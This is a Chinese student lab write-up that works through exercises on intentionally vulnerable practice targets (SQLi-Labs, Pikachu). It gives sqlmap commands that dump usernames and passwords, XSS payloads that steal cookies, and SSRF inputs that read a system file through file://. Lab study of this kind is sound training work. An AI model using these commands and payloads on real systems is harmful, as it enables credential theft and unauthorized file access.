---
title: "SQL注入与XSS综合测试：sqlmap实战与Pikachu靶场通关"
published: 2025-07-03
description: "使用sqlmap对SQLi-Labs Less-5进行自动化注入，逐步获取数据库、表、字段和数据；在Pikachu靶场完成反射型XSS、存储型XSS、DOM型XSS及XSS盲打共6关测试，并实践SSRF协议利用。"
tags: ["SQL注入", "sqlmap", "XSS", "反射型XSS", "存储型XSS", "DOM型XSS", "SSRF", "Pikachu"]
category: "大三下实训"
---

第一题、用sqlmap爆破sql注入less-5

python sqlmap.py -u "http://192.168.214.142/sql/Less-5/?id=1" –dbs

![图片](./images/jr4_test73_img4.png)

python sqlmap.py -u "http://192.168.214.142/sql/Less-5/?id=1" -D security –tables

![图片](./images/jr4_test73_img5.png)

python sqlmap.py -u "http://192.168.214.142/sql/Less-5/?id=1" -D security -T users –columns

![图片](./images/jr4_test73_img6.png)

python sqlmap.py -u "http://192.168.214.142/sql/Less-5/?id=1" -D security -T users -C username,password –dump

![图片](./images/jr4_test73_img7.png)

第二题、Pikachu -xss第1-6关

反射型xss（get）

搜索框输入<script>alert(1)</script>

![图片](./images/jr4_test73_img8.png)

打开控制台查看源代码，发现maxlength=”20”

![图片](./images/jr4_test73_img9.png)

把20修改成100试试，此时发现能完整输入<script>alert(1)</script>

![图片](./images/jr4_test73_img10.png)

成功弹窗

![图片](./images/jr4_test73_img11.png)

反射性xss(post)

admin/123456登录

![图片](./images/jr4_test73_img12.png)

搜索框输入<script>alert(document.cookie)</script>

![图片](./images/jr4_test73_img13.png)

存储型xss

留言板中输入<script>alert(1)</script>

![图片](./images/jr4_test73_img14.png)

刷新页面依旧还有弹窗

![图片](./images/jr4_test73_img15.png)

DOM型xss

输入123提交，发现“123”被发送到<a href=””>里

![图片](./images/jr4_test73_img2.png)

javascript:alert(1)

![图片](./images/jr4_test73_img16.png)

![图片](./images/jr4_test73_img3.png)

DOM型xss

1. 输入123
![图片](./images/jr4_test73_img1.png)

2.输入javascript:alert(1)

![图片](./images/jr4_test73_img17.png)

xss盲打

输入<script>alert(document.cookie)</script>提交

![图片](./images/jr4_test73_img18.png)

进入后台/xssblind/admin_login.php登录admin/123456，登录进去后立刻有弹窗

![图片](./images/jr4_test73_img19.png)

![图片](./images/jr4_test73_img20.png)

第三题、SSRF实验

靶机：192.168.214.142

攻击机：127.0.0.1

端口探测

输入：http://192.168.214.142:3306/

![图片](./images/jr4_test73_img21.png)

Web指纹探测

输入：http://192.168.214.142/phpMyAdmin

![图片](./images/jr4_test73_img22.png)

![图片](./images/jr4_test73_img23.png)

dict协议

输入：dict://192.168.214.142:3306/info

![图片](./images/jr4_test73_img24.png)

FTP协议

输入：ftp://192.168.214.142/

![图片](./images/jr4_test73_img25.png)

file协议

http://192.168.214.142/pikachu/vul/ssrf/ssrf_curl.php?url=file:///C:/WINDOWS/win.ini

![图片](./images/jr4_test73_img26.png)
